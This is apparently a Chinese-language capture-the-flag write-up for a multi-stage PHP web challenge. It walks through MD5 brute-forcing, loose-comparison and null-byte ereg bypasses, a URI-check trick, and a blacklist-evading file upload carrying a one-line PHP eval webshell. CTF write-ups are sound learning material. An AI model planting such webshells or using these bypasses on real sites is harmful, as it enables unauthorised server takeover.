@@ -1,0 +1,66 @@
+1. 在Cookie中发现又source的提示，base64得到：  
+[code]substr(md5($_GET[\'source\']),3,6)=="81a427"[/code]
+写个脚本爆破一下四位可见字符，得到一个简单的如下：  
+0k3~
+4c481a427cf4b427ff7b3bdbc3bf04e7
+
+访问：http://4e79618700b44607c.jie.sangebaimao.com/index.php?source=0k3~  
+得到源码。  
+
+2. == 和 ===  
+源码中先反序列化password，然后用==比较。可以使用如下绕过：  
+[code]var_dump('admin'==0);
+bool(true)
+var_dump('admin'===0);
+bool(false)[/code]
+
+写个输出序列化脚本得到：  
+[code]a:2:{s:8:"username";i:0;s:8:"password";i:0;}[/code]
+这里序列化生成了一个array。 输入到password，即进入到下一步。  
+
+3. %00 bypass ereg  
+
+[code]if (ereg("^[a-zA-Z0-9]+$", $_POST['salt']) === FALSE)
+		{
+			exit('<script>alert("友谊的小船,说翻就翻了！！")</script>');
+		}
+		elseif (strlen($_POST['salt']) < 11 && $_POST['salt'] > 999999999)
+		{
+			if (strpos($_POST['salt'], '*SGBM*') !== FALSE)
+			{
+				$_SESSION['admin'] = 1;
+				echo "<center style=\"font-size:36px;\"><a href=\"./admin/index.php\">Click jump to the Backstage</a></center>";
+			}
+[/code]
+
+看到最后要匹配*号，必然要bypass ereg函数了，查到了用%00  
+然后，根据php特性： 9e9 > 999999999  
+得到: salt=9e9%00*SGBM*  
+绕过进入下一步。  
+
+4.  Bypass request uri    
+判定规则很吓人，花费了时间，试了如下过了：  
+http://4e79618700b44607c.jie.sangebaimao.com/admin/index.php/admin/index.php  
+
+5. Bypass blacklist   
+
+黑名单没过滤inc后缀。 试了半天才找到。。。  
+windows下，本机测试可以使用"php "(加空格)绕过。  
+[code]-----------------------------16484400928503
+Content-Disposition: form-data; name="file"; filename="webshell_my123.inc"
+Content-Type: image/gif
+
+<?php @eval($_POST['chopper']);?>
+-----------------------------16484400928503--[/code]
+然后就是暴力跑一下文件名，因为和时间有关，很快就能找到。   
+
+6.  根据RGB画像素点  
+
+找到一个flag.jpg,里面藏了个flag.txt,里面是RGB文件。写个程序，画像素。  
+试了半天宽度。。 19*2  。 太长，我的屏幕不够，于是分为两部分上下画，得到flag。  
+[img src="http://static.sangebaimao.com/upload/image/201605/2016052209471680108.png" alt="flag_sangebaimao.png"/]
+
+7. 最后说一下  
+
+题目很有意思，小知识串成~~~
+
